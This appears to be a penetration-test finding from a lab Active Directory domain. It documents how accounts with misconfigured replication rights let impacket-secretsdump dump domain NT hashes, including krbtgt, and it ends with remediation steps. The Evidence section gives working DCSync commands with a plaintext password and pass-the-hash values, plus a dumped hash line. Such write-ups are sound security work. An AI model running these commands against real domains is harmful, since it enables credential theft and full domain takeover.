# Using DCSync To Harvest NT Hashes

| Field | Details |
|-------|---------|
| **Severity** | 🔴 Critical |
| **Technique** | DCSync |
| **Target** | `192.168.120.100` — `DC01-WINDOWSSERVER2019` |
| **Domain** | `lab.local` |
| **Prerequisite** | [Pass the Hash Finding](PassTheHash.md) |

---

## Description

BloodHound AD enumeration revealed 3 non-administrative accounts with misconfigured Active Directory replication rights (`GetChanges`, `GetChangesAll`, and `GetChangesInFilteredSet`). impacket-secretsdump with the `-just-dc` option can abuse the DC replication rights.

---

## Evidence

Using a non administrative account harvested from a BloodHound enumeration (RORIE.ROANA) the same NT Hashes were harvested as the Domain Administrator (CHRYSTAL_BURRIS) account and the Administrator account.

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b207f3a04617ddbb7249b71872abcf64:::
```

**Commands used:**

```bash
# Baseline dump using Administrator credentials
impacket-secretsdump -just-dc lab.local/Administrator:'Password123!'@192.168.120.100 > DCSync1.txt

# Dump using Domain Administrator CHRYSTAL_BURRIS via NT hash
impacket-secretsdump -just-dc -hashes :5c519514ffe21c74ce07ecb268a4ed14 lab.local/CHRYSTAL_BURRIS@192.168.120.100 > DCSync2.txt

# Dump using non-administrative account RORIE.ROANA via NT hash
impacket-secretsdump -just-dc -hashes :06ddfed6866a06022bf10ec31e754204 lab.local/RORIE.ROANA@192.168.120.100 > DCSync3.txt

# Validate identical output across all three dumps
diff DCSync1.txt DCSync2.txt
diff DCSync1.txt DCSync3.txt
```

> `diff DCSync1.txt DCSync2.txt` yields no difference.
> `diff DCSync1.txt DCSync3.txt` yields no difference.

---

## Impact

Harvesting the hashes results in the krbtgt hash which is used to create a Golden Ticket which allows an attacker to use the ticket to impersonate and access any account on the DC and ultimately acquire full domain access. The use of Golden Tickets will allow persistence in the DC without valid credentials even after password resets/updates.

---

## Remediation

> Remediations are not listed in any specific order of severity unless otherwise listed.

1. **Enforcement of the Policy of Least Privilege (PoLP)** to make sure all accounts do not have rights & privileges they do not require.

2. **Ensure that all DCSync privileges are exclusive to DC systems**, and never on non-DC systems.

3. **Using tools like BloodHound, provide regular audits on "privilege creep"** to remove and secure rights & privileges to accounts in which they are strictly necessary.

4. **Update krbtgt password twice in any events of remediation** to eliminate forged Kerberos tickets.

5. **Enable tracking on SIEM & EDR systems** to monitor for suspicious DC replication that come from non-DC systems.
